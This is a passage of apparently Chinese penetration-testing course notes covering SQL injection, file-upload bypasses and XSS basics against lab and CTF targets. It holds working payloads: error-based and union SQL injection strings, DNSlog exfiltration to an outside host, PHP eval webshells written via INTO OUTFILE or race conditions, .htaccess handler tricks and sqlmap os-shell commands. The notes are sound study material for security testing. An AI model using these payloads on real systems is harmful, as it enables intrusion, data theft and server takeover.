效果是一致的，却绕过了空格过滤x&quot;^updatexml(1,concat(0x7e,(version())),0)##注册成功就开始登录#易错点：登录的账号要注意，我们的账号是包含payload的，比如这里的账号就是 x&quot;^updatexml(1,concat(0x7e,(version())),0)#   #接下来点击我们的用户名----点击修改密码来触发数据库对当前用户名的比对，因为我们的用户名后面又注释符 # ，而正常的更新密码的语句一般为：update user set new_passwd=&#x27;新密码&#x27; where username = &#x27;用户名&#x27; and old_passwd = &#x27;旧密码&#x27;     ，所以我们的旧密码完全可以随便输入，因为注释符的存在，所以旧密码无论是啥都没关系案例截图：详见当前代码框下面的截图#下面的代码为获取详细的flag的注入语句test&quot;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#test&quot;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1)#test&quot;^updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag))),1)#test&quot;^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;))),1)#test&quot;^updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1)#test&quot;^updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),1)##得到flag的一部分：flag&#123;94ed4b89-f8b7-4997-8df4-e4    这是因为长度限制了，所以需要逆向的再获取flagtest&quot;^updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))),1)##1、得到逆向代码：       &#125;e70e54e0414e-4fd8-7994-7b8f-98接着将得到的逆向的flag进行反转，使用如下代码：    a = &#x27;:&#125;e70e54e0414e-4fd8-7994-7b8f-98&#x27;    a = a[::-1]    print(a)   #结果为：    89-f8b7-4997-8df4-e4140e45e07e&#125;:       #2、和正向的进行拼接 发现2部分falg在4997-e4这里都是重复的，所以只需要不全e4后面的代码   140e45e07e&#125; 即可flag&#123;94ed4b89-f8b7-4997-8df4-e4140e45e07e&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="/source/images/image-20210731210448334.png" alt="image-20210731210448334"></li>
<li><img src="/source/images/image-20210731210503368.png" alt="image-20210731210503368"></li>
<li><img src="/source/images/image-20210731210514495.png" alt="image-20210731210514495"></li>
</ul>
</li>
</ul>
<p>#案例3-Dnslog注入-本地Sqlilabs注入&amp;命令执行等</p>
<ul>
<li><p>特性：比较鸡肋，需要满足多个条件</p>
<ul>
<li>windows</li>
<li>存在注入点</li>
<li>需要支持load_file()函数</li>
<li>需要secure_file_priv 需要为空：需要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可<ul>
<li><img src="/source/images/image-20210801165434310.png" alt="image-20210801165434310"></li>
</ul>
</li>
</ul>
</li>
<li><p>```python<br>应用场景：解决不回显，反向连接，SQL注入，命令执行，SSRF等ping test.dbuh8a.ceye.ioping %USERNAME%.dbuh8a.ceye.ioselect load_file(‘\\xxxx.dbuh8a.ceye.io\aa’));select load_file(concat(‘\\‘,(select database()),’.dbuh8a.ceye.io\aa’));</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20210731214622552](/source/images/image-20210731214622552.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例4-高权限注入-跨库查询&amp;文件读取&amp;文件写入</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  实验：root xiaodi用户登录测试不同数据库用户数据操作，文件操作系统用户：所有数据库可看，文件读写正常普通用户：单个数据库可看，文件读写失败跨库查询猜解select load_file()select &#x27;a&#x27; into outfile &#x27;d:/www.txt&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="20、权限注入-amp-跨库-amp-文件读写-amp-命令执行"><a href="#20、权限注入-amp-跨库-amp-文件读写-amp-命令执行" class="headerlink" title="20、权限注入&amp;跨库&amp;文件读写&amp;命令执行"></a>20、权限注入&amp;跨库&amp;文件读写&amp;命令执行</h2><p>核心：首先判断是不是高权限用户，如果是，那么直接按照本课的命令进行高权限操作，如果不是，则进行普通的注入即可</p>
<ul>
<li>因为不同的数据库的高权限用户的叫法不一样，所以推荐使用sqlmap来进行判断<ul>
<li>python3 sqlmap.py -u “xx.xx.xx.xx/?id=1”  –is-dba    </li>
<li>如果返回True，则代表是高权限用户，就可以进行命令执行、跨库、文件操作、注册表操作、sql操作</li>
</ul>
</li>
</ul>
<p>1、高权限注入应用及原理判断</p>
<p>2、那些数据库存在高权限注入操作</p>
<p>3、高权限注入可操作具体有哪些方面</p>
<ul>
<li>linux上的mysql可以执行系统命令</li>
<li>mysql在修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启之后，可以执行读取与写入操作</li>
</ul>
<p>#案例1-MYSQL跨库-手工演示对比工具说明</p>
<p>什么是跨库？</p>
<ul>
<li><p>工具sqlmap进行跨库：使用 –tables能获取到所有的表，那么就是跨库</p>
</li>
<li><p>使用手工进行跨库</p>
<ul>
<li>```python<br>场景说明：A存在高权限注入导致同一数据库其他WEB应用数据泄露WEB应用A-<a href="http://127.0.0.1:8081/sqlilabs/WEB%E5%BA%94%E7%94%A8B-http://127.0.0.1:8081/maccms8/#information_schema%E6%95%B0%E6%8D%AE%E5%BA%93%E9%87%8C%E6%9C%89%E4%B8%AA%E8%A1%A8schemata%E9%87%8C%E5%82%A8%E5%AD%98%E4%BA%86%E6%89%80%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%80%8C%E8%AF%A5%E8%A1%A8%E9%87%8C%E9%9D%A2%E7%9A%84%E5%AD%97%E6%AE%B5SCHEMA_NAME%E4%B8%8B%E5%B0%B1%E6%98%AF%E6%89%80%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%90%8D%E5%AD%97">http://127.0.0.1:8081/sqlilabs/WEB应用B-http://127.0.0.1:8081/maccms8/#information_schema数据库里有个表schemata里储存了所有的数据库信息，而该表里面的字段SCHEMA_NAME下就是所有的数据库的名字</a>     select SCHEMA_NAME from information_schema.schemata;-1 union select 1,group_concat(SCHEMA_NAME),3 from information_schema.schemata–+#通过上一步获取到我们需要的数据库的名字：maccms#必须要通过限定数据库名为maccms才能查询到它里面的表-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’maccms’–+-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’mac_manager’ and table_schema=’maccms’–+#这里需要注意：因为是跨库，所以当我们从跨表查询数据，必须要加一个限定条件，比如哪个数据库、哪个表，两者用一个点 . 进行连接：maccms.mac_manager-1 union select 1,m_name,m_password from maccms.mac_manager–+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">\#案例2-MYSQL读写-手工演示对比工具说明</span><br><span class="line"></span><br><span class="line">- 缺点：都必须要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可，所以有很大的局限性</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  场景说明：WEB应用存在高权限注入点导致文件直接读写(后门植入)前提：知道绝对路径工具：Pangolin#可读取敏感文件，比如etc/passwd#易错点：需要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可-1 union select 1,load_file(&#x27;d:/test.txt&#x27;),3--+#当我们知道绝对路径，直接往绝对路径里写入一句话即可#比如这里的x可以替换成一句话， #易错点：需要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可-1 union select 1,&#x27;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&#x27;,3 into outfile &#x27;d:/www.txt&#x27;--+#易错点：如果网站做了防护，限制单引号或者eval等关键字的写入怎么办？	可以将一句话木马连同单引号转换为hex，通过小葵转换工具即可转换，因为在数据库中，hex的16进制也可以直接识别的   &#x27;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&#x27;     select 1,0x273C3F70687020406576616C28245F504F53545B2761747461636B275D293B3F3E27,3 into outfile &#x27;d:/shell.php&#x27;;WEB应用路径获取：说明文件,报错显示,特定源码爆出,配合读取中间件配置，爆破等	说明文件：比如phpadmin    特定源码：比如公开的cms里的目录结构    中间件配置：比如 宝塔，一般在绑定域名和路径的时候会需要设置，然后我们可以通过读取它的中间件的配置文件来获取绝对路径</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><img src="/source/images/image-20210801140021509.png" alt="image-20210801140021509"></p>
<p>​        <img src="/source/images/image-20210801172128323.png" alt="image-20210801172128323"></p>
</li>
</ul>
<p>#案例3-MSSQL注入-跨库&amp;文件读写&amp;命令执行</p>
<p>工具：Pangolin 对比MYSQL或其他数据库可操作方面</p>
<p>#案例4-ORACLE注入-工具可操作自动识别攻击</p>
<ul>
<li><pre><code class="python">SQLMAP--current-user 当前用户--is-dba     是否为管理员--file-read  从服务器读入，后面加上绝对路径，比如 &quot;d:/1.txt&quot; --file-write 从本地写入，和--file-dest搭配使用--file-dest  写入目标路径，和--file-write搭配使用#实列：   --file-write  &quot;e:/xiaoma.txt&quot;   --file-dest &quot;c:/www/1.php&quot; #上面的意思就是将我本地电脑下的xiiaoma.txt的内容写到目标服务器的www的目录下，并且保存为1.php--sql-shell  执行sql命令终端--os-shell  执行shell终端,会反弹一个shell回来，可以执行系统操作命令，并且返回一个url地址，该地址是一个上传文件的地址，我们可以通过该地址上传不容易被杀的马，然后拿下服务器权限（--os-cmd=ver 自定义命令（这里的ver是获取操作系统的版本） --os-cmd=OSCMD//执行操作系统命令--os-shell //反弹一个osshell--os-pwn //pwn，反弹msf下的shell或者vnc--os-smbrelay //反弹msf下的shell或者vnc--os-bof //存储过程缓存溢出--priv-esc //数据库提权#下面这2个语句是操作注册表的–reg-read –reg-add –reg-del –reg-key       --reg-value --reg-data --reg-typepython sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --file-read &quot;d:/test.txt&quot;python sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --file-write &quot;f:/host.txt&quot; --file-dest &quot;D:/phpstudy/PHPTutorial/WWW/sqlilabs/1.txt&quot;python sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --sql-shellselect * from mysql.userpython sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --os-shell
</code></pre>
</li>
</ul>
<p>#案例5-脚本语言SQL注入-PHP&amp;Javaweb&amp;Python</p>
<ul>
<li>语法，内置安全，结构等差异</li>
</ul>
<h2 id="—————SQL注入总结———"><a href="#—————SQL注入总结———" class="headerlink" title="—————SQL注入总结———-"></a>—————SQL注入总结———-</h2><p>SQL注入-安全测试思路总结</p>
<ul>
<li><p>漏洞判定-黑盒&amp;白盒</p>
</li>
<li><p>漏洞利用</p>
<ul>
<li>​    参数类型 <ul>
<li>决定是否闭合单引号</li>
</ul>
</li>
<li>​    数据库类型<ul>
<li>不同的数据库注入方法不一样</li>
</ul>
</li>
<li>​    数据提交方式<ul>
<li>不同的提交方式注入的位置不一样</li>
</ul>
</li>
<li>​    数据SQL查询方式<ul>
<li>不同的查询方式决定着是否是回显或者盲注</li>
</ul>
</li>
<li>​    数据是否加密编码等<ul>
<li>必须要将payload进行相同的编码才能注入</li>
</ul>
</li>
<li>​    数据是否存在回显等</li>
<li>​    注入权限是否高权限<ul>
<li>有高权限，直接通过高权限进行操作</li>
</ul>
</li>
</ul>
</li>
<li><p>漏洞危害</p>
<ul>
<li>​    单个数据库数据泄露<ul>
<li>普通用户</li>
</ul>
</li>
<li>​    所有数据库数据泄露<ul>
<li>高权限用户，跨库</li>
</ul>
</li>
<li>​    后台权限丢失-数据配合后台登录等</li>
<li>​    WEB权限丢失-文件操作,命令执行等</li>
<li>​    可能后续导致服务器权限丢失等</li>
</ul>
</li>
<li><p>漏洞特点</p>
<ul>
<li>​    1.开发语言决定SQL注入产生率<ul>
<li>php的sql注入多，java和python相对而言就比较少了</li>
</ul>
</li>
<li>​    2.数据库类型决定SQL注入利用过程</li>
<li>​    3.部分SQL注入发现需人工进行探针<ul>
<li>比如在查询方式为update、insert、delete的时候产生的注入，一般工具探测不到</li>
</ul>
</li>
<li>​    4.防护SQL注入代码过滤或部署WAF</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>21-25、渗透测试(xiaodi)</title>
    <url>/2021/08/10/21-25%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/</url>
    <content><![CDATA[<p>21、文件上传&amp;代码函数&amp;格式后缀&amp;场景</p>
<p>文件上传-测试场景WEB&amp;APP等</p>
<ul>
<li>应用场景：只要一个地方可以上传，那么就可以进行文件上传测试<span id="more"></span>
<ul>
<li>app<ul>
<li><img src="/source/images/image-20210802125224470.png" alt="image-20210802125224470"></li>
</ul>
</li>
<li>网站</li>
<li>软件</li>
<li>网站的聊天窗口，可以发送图片的那种<ul>
<li><img src="/source/images/image-20210802125143909.png" alt="image-20210802125143909"></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>文件上传-基本知识后门文件格式解析</p>
<ul>
<li>特性：什么格式的代码，必须要用什么格式的后缀才能解析<ul>
<li>比如php格式的一句话木马，必须要用php格式后缀才能被解析，如果采用txt后缀则不行</li>
</ul>
</li>
</ul>
<p>冰蝎下载地址：<a href="https://github.com/rebeyond/Behinder/releases">Releases · rebeyond/Behinder · GitHub</a></p>
<p>#案例4-文件上传-基本知识举例代码函数原理</p>
<p>例子：PHP文件上传处理操作 $_FILES&amp;表单</p>
<p>大小，名字，类型，临时名，上传内容</p>
<ul>
<li><img src="/source/images/image-20210802132810352.png" alt="image-20210802132810352"></li>
</ul>
<h2 id="22、文件上传JS-amp-后缀黑白名单-amp-格式检测"><a href="#22、文件上传JS-amp-后缀黑白名单-amp-格式检测" class="headerlink" title="22、文件上传JS&amp;后缀黑白名单&amp;格式检测"></a>22、文件上传JS&amp;后缀黑白名单&amp;格式检测</h2><p>#知识点：</p>
<p>1、过滤验证客户端及服务端差异</p>
<ul>
<li>分类<ul>
<li>客户端验证：自己的电脑上的浏览器上的JavaScript进行验证</li>
<li>服务端验证：服务器进行验证</li>
</ul>
</li>
<li>怎么分辨到底是客户端还是服务的验证？<ul>
<li>客户端<ul>
<li>可以在上传的页面，右键—查看源代码—里面会有一串JavaScript代码进行限制</li>
<li>如果我们上传一个不符合的格式的文件，它很快就弹出格式不正确，那么应该也是客户端验证，毕竟如果是服务端验证，会需要一点时间的</li>
<li>在上传php的时候抓包，如果我们点击上传的时候抓包，抓不到包，那么肯定就是客户端验证了，如果是服务端验证，必定会有数据包的<ul>
<li>易错点：为什么jpg可以抓到包而php抓不到？因为php触发拦截了，所以抓不到包，所以必须要通过上传php文件来进行测试</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>2、过滤验证检测后缀黑名单绕过</p>
<ul>
<li>黑名单好绕过</li>
</ul>
<p>3、过滤验证检测后缀白名单绕过</p>
<ul>
<li>修改mine</li>
<li>0x00和%00截断（需要满足php版本小于5.3.4和关掉php的魔术引号才行）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例1-后缀客户端验证-Js禁用&amp;Burp改包&amp;本地提交Pass01-客户端-验证方式绕过方法：	方法一：    	首先上传一张符合条件的图片（图片的内容里有一句话），然后抓包（此时可以抓到包，因为它是一张图片），然后修改数据包图片的后缀为php，这样就可以绕过了，同时该php可以直接用webshell工具进行连接，因为它里面包含了一句话木马     方法二：禁用js	#案例2-后缀黑名单验证-大小写&amp;加空格&amp;符号点&amp;::$DATA验证上传的后缀名是否在这个黑名单里，在的话一律不让上传Pass06-大小写-文件命名Pass07-加空格-系统特性Pass08-符号点-系统特性Pass09-::$DATA-系统特性Pass10-组合空格&amp;点-系统特性#案例3-后缀白名单验证-MIME修改&amp;%00截断&amp;0x00截断一、%00和0x00截断使用的前提条件：	（1）php版本必须小于5.3.4 	（2）打开php的配置文件php-ini，将magic_quotes_gpc设置为Off二、%00和0x00适用的位置：	%00一般用于url处，比如数据包的第一行，它一般拼接在url后面，比如下图的图一，在upload/ 后面拼接我们需要的文件名和后缀，接着在后面加上 %00 即可    0x00一般是在请求体中有一个上传的文件的保存路径的变量，我们需要在它后面拼接我们需要的文件名和后缀，比如1.php，然后在它后面按下空格，接着在hex的界面查看，将空格(hex下的20换成00即可)	    验证上传的后缀名是否在这里白名单里，不在的话一律不让上传Pass02-MIME-文件属性Pass12-%00-CVE-2015-2348Pass13-0x00-命名安全#案例4-后缀变异性验证-Finecms任意文件上传-验证MIME本地Finecms测试-配合Fofa搜索-&quot;FineCMS公益软件&quot;代码段：/finecms/dayrui/controllers/member/Account.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/source/images/image-20210803122815756.png" alt="image-20210803122815756"></p>
<p><img src="/source/images/image-20210803123117618.png" alt="image-20210803123117618"></p>
<p>文件上传靶场：<a href="https://github.com/c0ny1/upload-labs">GitHub - c0ny1/upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场</a></p>
<p>文件上传流程图：</p>
<ul>
<li><img src="/source/images/image-20210802202200990.png" alt="image-20210802202200990"></li>
</ul>
<h2 id="23、文件上传解析漏洞-amp-条件竞争-amp-2次渲染"><a href="#23、文件上传解析漏洞-amp-条件竞争-amp-2次渲染" class="headerlink" title="23、文件上传解析漏洞&amp;条件竞争&amp;2次渲染"></a>23、文件上传解析漏洞&amp;条件竞争&amp;2次渲染</h2><p>1、过滤验证检测内容绕过</p>
<p>2、过滤验证代码逻辑安全</p>
<p>3、过滤验证解析&amp;格式&amp;规则</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例1-检测内容-图片后门&amp;二次渲染检测内容：修改文件头，比如gif的文件头就是GIF89aPass14 图片后门Pass17 二次渲染（一般使用gif进行绕过）图片后门制作：    copy shell.jpg/b + shell.php/a s.jpg    copy merge.gif/b + shell.php/a s.gif    c32asm 对比前后图片，观察哪些数据保留了，然后将一句话插在里面，再次上传，观察一句话还在不在</span></span><br></pre></td></tr></table></figure>





<p>#案例2-代码逻辑-单次过滤&amp;条件竞争</p>
<ul>
<li><p>Pass11 单次过滤</p>
<ul>
<li>只是过滤了一次，没有循环过滤，比如 pphphp  ,因为只过滤了一次，所以可以绕过</li>
</ul>
</li>
<li><p>Pass18 条件竞争</p>
<ul>
<li><p>产生原因：先移动上传的文件，然后再对移动的文件进行过滤，就会产生条件竞争</p>
</li>
<li><p>基本原理：上传php木马文件，因为网站首先会移动我们的木马文件到其他目录，接着会对该文件进行过滤，比如如果是php后缀就会删除该文件，所以我们可以上传一个a.php文件，因为网站是先移动后过滤（删除），所以a.php文件在对方服务器上存在过，这时我们完全可以不停的上传该a.php文件，该a.php文件的内容就是在当前目录创建一个新文件，新文件的内容是一句话木马，所以一旦我们访问到了a.php,对方的服务器就会自动从创建一个内容为一句话木马的php文件，那么我们的目的就达到了</p>
</li>
<li><p>实现步骤：</p>
<ul>
<li><p>burp不停的上传a.php文件，a.php的代码必须是：</p>
<ul>
<li>```php<?php $file=fopen('x.php','w+');fwrite($file,'<?php @eval($_POST[x];?>‘);fclose($file);?&gt;<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    - 其次，不停的访问该上传的a.php文件，目的是触发它的php文件，让他创建shell</span><br><span class="line"></span><br><span class="line">    - 一旦访问成功，shell就创建成功，到时候只需要用webshell工具连接x.php即可，密码是x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">web中间件常见漏洞：参考pdf  web中间件常见漏洞总结.pdf  ，有具体的pdf</span><br><span class="line"></span><br><span class="line">- ![image-20210803123453617](/source/images/image-20210803123453617.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#案例3-解析安全-格式变异&amp;中间件解析比如：可以php5  或者phtml    这些后缀也可以被当作php来执行Pass03 php5对应Pass04 .htaccess   （适用于apache）Vulhub 解析漏洞-Nginx(cve2013&amp;解析)Mozhe 解析漏洞-IIS-内部文件上传系统测试htaccess文件：下面是代码，意思就是当我们将该.htaccess文件上传到对方目录，再上传一个shell.jpg的图片马，再访问该图片马，那么该shell.jpg也会被当作php执行GIF89a&lt;?php @eval($_POST[&#x27;s&#x27;]);phpinfo();?&gt;&lt;FilesMatch &quot;shell.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例4-CTF分享-Buuoj平台部分上传题库https://buuoj.cn/challenges[极客大挑战 2019]Upload	大挑战：限制了后缀、检测了文件头、不允许文件的内容里有 &lt;?    ，找不到上传的图片的地址    绕过：后缀改为phtml、加文件头GIF89a   、通过变异的一句话木马绕过，通过扫目录、猜解目录得到上传的文件的地址，比如这里就猜 /upload    变异的语句和木马如下（可自行百度，只要找到不包含问号的即可）：&lt;script language=&quot;php&quot;&gt;eval($_POST[x])&lt;/script&gt;// ]]&gt;&lt;/script&gt;参考连接：        [ACTF2020 新生赛]Upload[GXYCTF2019]BabyUpload......</span></span><br></pre></td></tr></table></figure>



<h2 id="24、文件上传CTF-amp-中间件-amp-CMS-amp-编辑器"><a href="#24、文件上传CTF-amp-中间件-amp-CMS-amp-编辑器" class="headerlink" title="24、文件上传CTF&amp;中间件&amp;CMS&amp;编辑器"></a>24、文件上传CTF&amp;中间件&amp;CMS&amp;编辑器</h2><p>#知识点：</p>
<p>1、文件上传常规类应用场景</p>
<p>2、文件上传CMS类应用场景</p>
<p>3、文件上传编辑器类应用场景</p>
<p>4、文件上传中间件类应用场景</p>
<p>5、文件上传CTF比赛类应用场景</p>
<p>#思路点：</p>
<ul>
<li>文件上传不管是发现还是利用上都会根据产生层面而不同，</li>
<li>常规无资料采用常规思路测试，有资料（往上搜索有的话）的情况下直接参考资料进行。</li>
</ul>
<p>#案例1-针对CMS类思路-phpcms</p>
<ul>
<li><p>思路：去往上搜索该cms的存在的漏洞，比如这里就是phpcms的上传漏洞，找到后直接根据别人给的资料进行复现即可</p>
</li>
<li><p><a href="https://www.cnblogs.com/sqyysec/p/6725870.html">https://www.cnblogs.com/sqyysec/p/6725870.html</a></p>
</li>
</ul>
<p>#案例2-针对编辑器类思路-Ueditor</p>
<ul>
<li><p>怎么知道当前编辑器是什么编辑器？</p>
<ul>
<li>编辑器里有一个帮助按钮，点击查看一般就会有当前编辑器的信息</li>
</ul>
</li>
<li><p><a href="https://blog.csdn.net/sinat_40293958/article/details/107208040">https://blog.csdn.net/sinat_40293958/article/details/107208040</a></p>
</li>
</ul>
<p>编辑器类和cms类的区别？</p>
<ul>
<li>假设当前cms是已知的，也存在编辑器，那么我们怎么在网上搜索资料？<ul>
<li>如果上传功能在编辑器，我们就搜索当前编辑器的上传漏洞，而不能搜索cms的上传漏洞，当然如果当前编辑器没有漏洞，那么可以根据当前cms的名称去搜索该cms的其他漏洞<ul>
<li>编辑器图片<ul>
<li><img src="/source/images/image-20210804122650803.png" alt="image-20210804122650803"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>#案例3-针对中间件类思路-Weblogic（基于java环境）</p>
<ul>
<li><p>怎么发现当前网站有没有Weblogic？</p>
<ul>
<li>扫描端口，weblogic的端口是7001</li>
</ul>
</li>
<li><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
</li>
<li><p><a href="https://vulhub.org/#/environments/weblogic/CVE-2018-2894/">https://vulhub.org/#/environments/weblogic/CVE-2018-2894/</a></p>
<ul>
<li><p>该上传漏洞前提：需要账号密码</p>
<ul>
<li>账号密码的获取，可以采用默认密码或者爆破进行尝试</li>
</ul>
</li>
<li><p>该上传漏洞需要jsp后门：因为是基于java环境的</p>
</li>
</ul>
</li>
</ul>
<p>#案例4-针对CTF比赛类思路-[GXYCTF2019]&amp;[RoarCTF 2019]</p>
<ul>
<li>```python<br><a href="https://github.com/TheKingOfDuck/fuzzDicts/[GXYCTF2019]BabyUploadFuzz-fuzzDicts-upload">https://github.com/TheKingOfDuck/fuzzDicts/[GXYCTF2019]BabyUploadFuzz-fuzzDicts-upload</a>&lt;FilesMatch “s.jpg”&gt;  SetHandler application/x-httpd-php</FilesMatch><script language='php'>assert($_REQUEST['cmd'])</script><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  [RoarCTF 2019]Simple Upload#前提：需要thinkphp基础，要知道怎么调用文件Tp-URL模式-代码审计-Pass21Py-构造上传-无回显命名-发包访问http://document.thinkphp.cn/manual_3_2.htmlimport requestsurl=&#x27;http://14a56f1b-f5ca-483e-a0d7-0d503a8db91a.node3.buuoj.cn/index.php/home/index/upload&#x27;file1=&#123;&#x27;file&#x27;:open(&#x27;f:\\1.txt&#x27;,&#x27;r&#x27;)&#125;file2=&#123;&#x27;file[]&#x27;:open(&#x27;f:\\1.php&#x27;,&#x27;r&#x27;)&#125;r = requests.post(url,files = file1)print(r.text)r = requests.post(url,files = file2)print(r.text)r = requests.post(url, files = file1)print(r.text)&#x27;&#x27;&#x27;import requestsimport timefor i in range(736769,755374,1):    url=&#x27;http://14a56f1b-f5ca-483e-a0d7-0d503a8db91a.node3.buuoj.cn/Public/Uploads//2021-03-14//604cf0b&#x27;    urls=url+str(i)+&#x27;.php&#x27;    #print(str(i))    code=requests.get(urls).status_codeif code==&#x27;200&#x27;:break    print(urls+&#x27;-&gt;&#x27;+str(code))    time.sleep(0.2)    </span><br></pre></td></tr></table></figure></li>
</ul>
<p>漏洞复现靶场：<a href="https://www.vulhub.org/">https://www.vulhub.org/</a></p>
<p>webshll地址：<a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
<h2 id="—————文件上传总结———"><a href="#—————文件上传总结———" class="headerlink" title="—————文件上传总结———-"></a>—————文件上传总结———-</h2><p>总体思路：优先级从高到低，在上传的时候注意观察前端的提示和数据包的返回包</p>
<ul>
<li><p>编辑器上传</p>
</li>
<li><p>已知cms</p>
</li>
<li><p>常规上传</p>
<ul>
<li><p>使用正常的图片，然后fuzz它的后缀名，fuzz的字典：<a href="https://github.com/TheKingOfDuck/fuzzDicts/">https://github.com/TheKingOfDuck/fuzzDicts/</a></p>
<ul>
<li>成功就是黑名单<ul>
<li>接着修改文件内容，插入一句话，看能否成功<ul>
<li>如果失败，就尝试修改IMIE，如果还不成功，就尝试修改文件头</li>
</ul>
</li>
</ul>
</li>
<li>失败就是白名单<ul>
<li>白名单可以尝试如下方法<ul>
<li>00截断</li>
<li>0x00截断</li>
<li>配合中间件解析漏洞：web中间件常见漏洞：参考pdf  web中间件常见漏洞总结.pdf  ，有具体的pdf</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="25、XSS跨站-amp-反射型-amp-存储型-amp-DOM型"><a href="#25、XSS跨站-amp-反射型-amp-存储型-amp-DOM型" class="headerlink" title="25、XSS跨站&amp;反射型&amp;存储型&amp;DOM型"></a>25、XSS跨站&amp;反射型&amp;存储型&amp;DOM型</h2><p>1、XSS跨站原理&amp;分类&amp;危害&amp;修复</p>
<ul>
<li><p>原理</p>
<ul>
<li>指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。</li>
</ul>
</li>
<li><p>漏洞产生的地方</p>
<ul>
<li>数据交互的地方<ul>
<li>​    get、post、headers</li>
<li>​    反馈与浏览</li>
<li>​    富文本编辑器</li>
<li>​    各类标签插入和自定义</li>
</ul>
</li>
<li>数据输出的地方<ul>
<li>​    用户资料</li>
<li>​    关键词、标签、说明</li>
<li>​    文件上传</li>
</ul>
</li>
</ul>
</li>
<li><p>分类</p>
<ul>
<li>​    反射型（非持久型）<ul>
<li>前提：必须要将构造的payload发送给被攻击者触发才有用，比较鸡肋</li>
</ul>
</li>
<li>​    存储型（持久型）</li>
<li>​    DOM型</li>
<li>​    mXSS(突变型XSS) </li>
<li>​    UXSS（通用型xss）</li>
<li>​    Flash XSS</li>
<li>​    UTF-7 XSS</li>
<li>​    MHTML XSS</li>
<li>​    CSS XSS </li>
<li>​    VBScript XSS</li>
<li>​    …….</li>
</ul>
</li>
<li><p>​    危害</p>
<ul>
<li>​    网络钓鱼，包括获取各类用户账号；</li>
<li>​    窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作；</li>
<li>​    劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等；</li>
<li>​    强制弹出广告页面、刷流量等；</li>
<li>​    网页挂马；</li>
<li>​    进行恶意操作，如任意篡改页面信息、删除文章等；</li>
<li>​    进行大量的客户端攻击，如ddos等；</li>
<li>​    获取客户端信息，如用户的浏览历史、真实ip、开放端口等；</li>
<li>​    控制受害者机器向其他网站发起攻击；</li>
